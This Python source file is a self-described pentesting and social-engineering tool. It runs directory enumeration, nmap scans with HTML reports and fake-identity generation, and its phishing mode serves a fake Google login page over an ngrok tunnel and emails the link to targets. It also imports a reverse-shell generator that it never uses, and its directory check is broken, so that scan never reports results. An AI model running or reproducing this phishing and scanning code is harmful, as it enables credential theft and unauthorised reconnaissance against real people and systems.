import argparse
import socket
import requests
import subprocess
import lxml.etree as ET
import http.server
import socketserver
import os
import cgi
import nmap
import lxml.html
import SendEmail
from lxml import etree
from faker import Faker
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from RevTCPShellGen import RS
from pyngrok import ngrok

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def directory_enum(URL):
    with open("directory-dic-medium.txt","r") as f:
        for dic in f:
            try:
                new_url = f"https://{URL}/{dic}"
                request = requests.get(new_url)
                if request == 200:
                    print(f"{bcolors.WARNING}Directory founded: {new_url}")
            except:
                new_url = f"http://{URL}/{dic}"
                request = requests.get(new_url)
                if request == 200:
                    print(f"{bcolors.WARNING}Directory founded: {new_url}")

def default_scan(Host):
    os.chdir("nmap")
    os.system(f"nmap.exe --open -n -T3 {Host}")
    os.chdir("../")

def full_scan(Host, Ports):
    os.chdir("nmap")
    os.system(f"nmap.exe -sC -sV -n -T3 -p{Ports} {Host} -oX nmap_output.xml")
    os.system("move nmap_output.xml ../")
    os.chdir("../")
    # Ref: http://makble.com/convert-xml-to-html-with-lxml-xslt-in-python
    xslt_doc = etree.parse("report_format.xslt")
    xslt_transformer = etree.XSLT(xslt_doc)
    source_doc = etree.parse("nmap_output.xml")
    output_doc = xslt_transformer(source_doc)
    output_doc.write("scan_report.html", pretty_print=True)

def phishing_atck():
    opt = 1
    while(opt != 0):
        opt = int(input(bcolors.OKCYAN + """1) Email Vector Attack
2) Create a Fake ID
0) Exit
CMD> """ + bcolors.ENDC))
        if opt == 1:
            # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:8000">
            dir = os.getcwd()
            tunnel = ngrok.connect(f"file:///{dir}\google-login").public_url
            print(tunnel)
            SendEmail.send(tunnel)
            input()
            ngrok.disconnect(tunnel)
        elif opt == 2:
            fake = Faker()
            print("Name: ", fake.name())
            print("Email: ", fake.email())
            print("Country: ", fake.country())
            print("Text: ", fake.text())


if __name__ == "__main__":
    print("""          _______  _        _______  _______
|\     /|(  ____ \( (    /|(  ___  )(       )
| )   ( || (    \/|  \  ( || (   ) || () () |
| |   | || (__    |   \ | || |   | || || || |
( (   ) )|  __)   | (\ \) || |   | || |(_)| |
 \ \_/ / | (      | | \   || |   | || |   | |
  \   /  | (____/\| )  \  || (___) || )   ( |
   \_/   (_______/|/    )_)(_______)|/     \|
                                             """)
    print(bcolors.WARNING + "Pentesting and Social-Engineer Tool")
    print(bcolors.WARNING + """Warning: This tool is for educational and testing purposes,
    please use it with discretion. We are not responsible for any use against the law.""" + bcolors.ENDC)
    parser = argparse.ArgumentParser()
    parser.add_argument("-host", dest = "host", help = "Target Specification [Optional if you want to scan a network]")
    parser.add_argument("-ports", dest = "ports", help = "Specify the ports for the network scan [Optional]")
    parser.add_argument("-p", "--phishing", help = "Phishing Attack" , action="store_true")
    params = parser.parse_args()
    if params.host and params.ports and not params.phishing:
        full_scan(params.host,params.ports)
    elif params.phishing:
        phishing_atck()
    if params.host and not params.ports:
        default_scan(params.host)
